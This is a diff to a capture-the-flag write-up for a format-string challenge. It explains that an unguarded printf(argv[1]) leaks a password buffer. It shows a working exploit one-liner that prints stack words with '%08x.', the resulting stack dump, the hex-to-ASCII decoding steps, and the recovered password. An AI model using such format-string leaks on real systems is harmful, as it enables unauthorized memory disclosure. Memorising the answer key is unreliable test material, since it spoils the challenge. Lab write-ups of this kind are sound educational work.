@@ -18,9 +18,18 @@ int main(int argc, char *argv[]){
         return 0;
 }
 ```
-
+The code open file **.passwd** which includes the password we need, then write it into **buffer** array. <br>
+The vulnerability in `printf(argv[1]);`, it execute without **Format specifier".**So we can take advantage of this  to look into the stack to find out the password.
 ### Solution:
-
-Pass: 1w4ntm0r3pr0np1s
+- We'll "brute-force" the buffer space and examine the output value. Print the value with hex code: <br>
+`./ch5 $(python -c "print '%08x.'*32")`
+- Output:
+```
+00000020.0804b160.0804853d.00000009.bffffcc5.b7e1b589.bffffb94.b7fc3000.b7fc3000.0804b160.39617044.28293664.6d617045.bf000a64.0804861b.00000002.bffffb94.bffffba0.cfa6f800.bffffb00.00000000.00000000.b7e03f21.b7fc3000.b7fc3000.00000000.b7e03f21.00000002.bffffb94.bffffba0.bffffb24.00000001.
+```
+- Convert to ASCII text ([HextoText](https://www.rapidtables.com/convert/number/hex-to-ascii.html)):
+![image](https://user-images.githubusercontent.com/48288606/141614663-d2edc72c-3b5f-4267-9ec4-aefeb2fcfeb7.png)
+As illustrated, a part of string above contains the real password; therefore, we just write these bytes into "big endian" format and convert again to hex.
+Pass: Dpa9d6)(Epamd
 
 
